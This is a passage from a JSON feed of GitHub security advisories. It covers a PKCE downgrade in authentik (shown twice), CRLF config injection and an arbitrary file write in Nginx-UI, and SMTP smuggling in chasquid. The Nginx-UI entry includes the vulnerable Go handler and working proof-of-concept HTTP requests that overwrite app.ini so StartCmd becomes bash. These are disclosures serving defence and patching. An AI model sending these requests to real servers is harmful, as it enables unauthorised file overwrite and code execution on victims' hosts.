check.</p>\n<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>\n<p>The OAuth BCP (<a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics\">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>\n<h2 id=\"for-more-information\">For more information</h2>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:security@goauthentik.io\">security@goauthentik.io</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n<li><a href=\"https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a\">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23647\">https://nvd.nist.gov/vuln/detail/CVE-2024-23647</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj",
            "title": "[goauthentik.io] Authentik vulnerable to PKCE downgrade attack",
            "date_modified": "2024-01-30T19:34:59.000Z",
            "date_published": "2024-01-29T22:30:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>\n<h2 id=\"patches\">Patches</h2>\n<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>\n<h2 id=\"details\">Details</h2>\n<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE check.</p>\n<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>\n<p>The OAuth BCP (<a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics\">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>\n<h2 id=\"for-more-information\">For more information</h2>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:security@goauthentik.io\">security@goauthentik.io</a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n<li><a href=\"https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a\">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23647\">https://nvd.nist.gov/vuln/detail/CVE-2024-23647</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mrx3-gxjx-hjqj\">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj",
            "title": "[goauthentik.io] Authentik vulnerable to PKCE downgrade attack",
            "date_modified": "2024-01-30T19:34:59.000Z",
            "date_published": "2024-01-29T22:30:54.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Fix bypass to the following bugs</p>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35</a></li>\n</ul>\n<p>Allowing to inject directly in the <code>app.ini</code> via CRLF to change the value of <code>test_config_cmd</code> and <code>start_cmd</code> resulting in an Authenticated RCE</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Authenticated Remote execution on the host</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23828\">https://nvd.nist.gov/vuln/detail/CVE-2024-23828</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1\">https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qcjq-7f7v-pvc8\">https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qcjq-7f7v-pvc8",
            "title": "[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to authenticated RCE through injecting into the application config via CRLF",
            "date_modified": "2024-01-29T22:30:25.000Z",
            "date_published": "2024-01-29T22:30:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qcjq-7f7v-pvc8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The Import Certificate feature allows arbitrary write into the system. The feature does not check if the provided user input is a certification/key and allows to write into arbitrary paths in the system.</p>\n<p><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></p>\n<pre><code>func AddCert(c *gin.Context) {\n    var json struct {\n        Name                  string `json:\"name\"`\n        SSLCertificatePath    string `json:\"ssl_certificate_path\" binding:\"required\"`\n        SSLCertificateKeyPath string `json:\"ssl_certificate_key_path\" binding:\"required\"`\n        SSLCertificate        string `json:\"ssl_certificate\"`\n        SSLCertificateKey     string `json:\"ssl_certificate_key\"`\n        ChallengeMethod       string `json:\"challenge_method\"`\n        DnsCredentialID       int    `json:\"dns_credential_id\"`\n    }\n    if !api.BindAndValid(c, &amp;json) {\n        return\n    }\n    certModel := &amp;model.Cert{\n        Name:                  json.Name,\n        SSLCertificatePath:    json.SSLCertificatePath,\n        SSLCertificateKeyPath: json.SSLCertificateKeyPath,\n        ChallengeMethod:       json.ChallengeMethod,\n        DnsCredentialID:       json.DnsCredentialID,\n    }\n\n    err := certModel.Insert()\n\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    content := &amp;cert.Content{\n        SSLCertificatePath:    json.SSLCertificatePath,\n        SSLCertificateKeyPath: json.SSLCertificateKeyPath,\n        SSLCertificate:        json.SSLCertificate,\n        SSLCertificateKey:     json.SSLCertificateKey,\n    }\n\n    err = content.WriteFile()\n\n    if err != nil {\n        api.ErrHandler(c, err)\n        return\n    }\n\n    c.JSON(http.StatusOK, Transformer(certModel))\n}\n</code></pre>\n<p><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></p>\n<pre><code>func (c *Content) WriteFile() (err error) {\n    // MkdirAll creates a directory named path, along with any necessary parents,\n    // and returns nil, or else returns an error.\n    // The permission bits perm (before umask) are used for all directories that MkdirAll creates.\n    // If path is already a directory, MkdirAll does nothing and returns nil.\n\n    err = os.MkdirAll(filepath.Dir(c.SSLCertificatePath), 0644)\n    if err != nil {\n        return\n    }\n\n    err = os.MkdirAll(filepath.Dir(c.SSLCertificateKeyPath), 0644)\n    if err != nil {\n        return\n    }\n\n    if c.SSLCertificate != \"\" {\n        err = os.WriteFile(c.SSLCertificatePath, []byte(c.SSLCertificate), 0644)\n        if err != nil {\n            return\n        }\n    }\n\n    if c.SSLCertificateKey != \"\" {\n        err = os.WriteFile(c.SSLCertificateKeyPath, []byte(c.SSLCertificateKey), 0644)\n        if err != nil {\n            return\n        }\n    }\n\n    return\n}\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>POST /api/cert HTTP/1.1\nHost: 127.0.0.1:9000\nContent-Length: 144\nAccept: application/json, text/plain, */*\nAuthorization: &lt;JWT&gt;\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7\nConnection: close\n\n{\"name\":\"poc\",\"ssl_certificate_path\":\"/tmp/test\",\"ssl_certificate_key_path\":\"/tmp/test2\",\"ssl_certificate\":\"test\",\"ssl_certificate_key\":\"test2\"}\n</code></pre>\n<pre><code>root@aze:~/nginx# ls -la /tmp/test*\n-rw-r--r-- 1 root root 4 Jan 24 13:33 /tmp/test\n-rw-r--r-- 1 root root 5 Jan 24 13:33 /tmp/test2\n</code></pre>\n<p>It's possible to leverage it into an RCE in a senario by overwriting the config file app.ini - But it will require the app.</p>\n<pre><code>root@aze:~/nginx# cat app.ini  | grep \"StartCmd\"\nStartCmd          = login\n</code></pre>\n<p>Then we overwrite the <code>StartCmd</code> with <code>bash</code></p>\n<pre><code>POST /api/cert HTTP/1.1\nHost: 127.0.0.1:9000\nContent-Length: 980\nAccept: application/json, text/plain, */*\nAuthorization: &lt;JWT&gt;\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\nContent-Type: application/json\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7\nConnection: close\n\n{\"name\":\"poc\",\"ssl_certificate_path\":\"/root/nginx/app.ini\",\"ssl_certificate_key_path\":\"/tmp/test2\",\"ssl_certificate\":\"[server]\\r\\nHttpHost          = 0.0.0.0\\r\\nHttpPort          = 9000\\r\\nRunMode           = debug\\r\\nJwtSecret         = 504f334b-ac68-4fbc-9160-2ecbf9e5794c\\r\\nNodeSecret        = 139ab224-9e9e-444f-987e-b3a651175ad5\\r\\nHTTPChallengePort = 9180\\r\\nEmail             = props@pros.com\\r\\nDatabase          = database\\r\\nStartCmd          = bash\\r\\nCADir             = dqsdqsd\\r\\nDemo              = false\\r\\nPageSize          = 10\\r\\nGithubProxy       = dqsdqfsdfsdfsdfsd\\r\\n\\r\\n[nginx]\\r\\nAccessLogPath =\\r\\nErrorLogPath  =\\r\\nConfigDir     =\\r\\nPIDPath       =\\r\\nTestConfigCmd =\\r\\nReloadCmd     =\\r\\nRestartCmd    =\\r\\n\\r\\n[openai]\\r\\nBaseUrl = \\r\\nToken   =\\r\\nProxy   =\\r\\nModel   = \\r\\n\\r\\n[casdoor]\\r\\nEndpoint     =\\r\\nClientId     =\\r\\nClientSecret =\\r\\nCertificate  =\\r\\nOrganization =\\r\\nApplication  =\\r\\nRedirectUri  =\",\"ssl_certificate_key\":\"test2\"}\n</code></pre>\n<pre><code>root@aze:~/nginx# cat app.ini  | grep \"StartCmd\"\nStartCmd          = bash\n</code></pre>\n<p>For the new config to be applied the app needs to be restarted</p>\n<p><img alt=\"image\" src=\"https://user-images.githubusercontent.com/26652608/299331664-6415a8c1-6611-4e53-8137-3e574c58da28.png\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>Arbitrary write/overwrite into the host file system with a risk of remote code execution if the app restarts.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m\">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23827\">https://nvd.nist.gov/vuln/detail/CVE-2024-23827</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199\">https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></li>\n<li><a href=\"https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15\">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xvq9-4vpv-227m\">https://github.com/advisories/GHSA-xvq9-4vpv-227m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xvq9-4vpv-227m",
            "title": "[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to arbitrary file write through the Import Certificate feature",
            "date_modified": "2024-01-29T22:30:19.000Z",
            "date_published": "2024-01-29T22:30:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xvq9-4vpv-227m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>chasquid before 1.13 allows SMTP smuggling because LF-terminated lines are accepted.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-52354\">https://nvd.nist.gov/vuln/detail/CVE-2023-52354</a></li>\n<li><a href=\"https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24\">https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24</a></li>\n<li><a href=\"https://github.com/albertito/chasquid/issues/47\">https://github.com/albertito/chasquid/issues/47</a></li>\n<li><a href=\"https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74\">https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g4x3-mfpj-f335\">https://github.com/advisories/GHSA-g4x3-mfpj-f335</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g4x3-mfpj-f335",
            "title": "[github.com/albertito/chasquid] chasquid HTTP Request/Response Smuggling vulnerability",
            "date_modified": "2024-01-29T22:29:09.000Z",
            "date_published": "2024-01-22T06:30:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g4x3-mfpj-f335"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}